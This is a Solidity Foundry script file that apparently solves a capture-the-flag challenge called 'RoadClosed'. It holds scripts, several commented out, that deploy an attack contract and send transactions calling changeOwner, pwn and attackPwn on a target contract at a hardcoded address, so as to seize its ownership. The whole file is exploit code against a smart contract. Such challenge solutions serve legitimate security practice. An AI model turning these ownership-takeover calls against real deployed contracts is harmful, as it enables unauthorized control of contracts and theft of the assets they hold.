// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.7;

import "../lib/forge-std/src/Script.sol";
import "../src/HackRoadClosed.sol";

// contract Deploy is Script {
//     function run() public {
//         vm.startBroadcast();
//         HackRoadClosed weapon = new HackRoadClosed();
//         vm.stopBroadcast();
//     }
// }

// contract ChangeOwner is Script {
//     function run() public {
//         vm.startBroadcast();

//         RoadClosed target = RoadClosed(
//             0xD2372EB76C559586bE0745914e9538C17878E812
//         );
//         target.changeOwner(0xe351A23BB54F4a7Ca10156eA9d82858C16D69E30);
//         vm.stopBroadcast();
//     }
// }

contract ManualPwn is Script {
    function run() public {
        vm.startBroadcast();

        RoadClosed target = RoadClosed(
            0xD2372EB76C559586bE0745914e9538C17878E812
        );
        target.pwn(0xe351A23BB54F4a7Ca10156eA9d82858C16D69E30);
        vm.stopBroadcast();
    }
}


// contract Exploit is Script {
//     function run() public {
//         vm.startBroadcast();
//         address weaponAddress = vm.envAddress("weapon_address");
//         HackRoadClosed weapon =  HackRoadClosed(weaponAddress);
//         weapon.attackPwn(weaponAddress);
//         vm.stopBroadcast();
//     }
// }
